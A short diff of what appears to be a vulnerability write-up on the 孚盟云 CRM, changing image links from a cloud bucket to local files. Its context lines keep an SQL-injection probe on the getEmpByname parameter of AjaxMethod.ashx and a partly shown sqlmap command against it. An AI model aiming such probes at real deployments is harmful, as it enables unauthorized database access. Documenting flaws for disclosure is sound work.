@@ -22,7 +22,7 @@ title="孚盟云 "
 
 
 
-![image-20220210184424096](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101844185.png)
+![image-20220210184424096](./images/202202101844185.png)
 
 
 
@@ -34,7 +34,7 @@ title="孚盟云 "
 http://xxx.xxx.xxx.xxx/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27
 ```
 
-![image-20220210184439151](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101844214.png)
+![image-20220210184439151](./images/202202101844214.png)
 
 
 
@@ -48,4 +48,4 @@ sqlmap -u "http://xxx.xxx.xxx.xxx/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=
 
 
 
-![image-20220210184456424](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101844599.png)
+![image-20220210184456424](./images/202202101844599.png)
